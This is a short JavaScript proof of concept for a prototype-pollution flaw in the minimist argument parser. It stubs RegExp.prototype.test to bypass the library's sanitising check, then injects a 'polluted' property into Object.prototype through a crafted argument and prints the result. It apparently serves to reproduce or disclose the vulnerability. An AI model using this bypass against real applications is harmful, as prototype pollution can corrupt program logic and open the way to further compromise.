RegExp.prototype.test = () => true;
console.log({}.polluted);
require('minimist')('constructor.prototype.polluted yes'.split(' '));
console.log({}.polluted);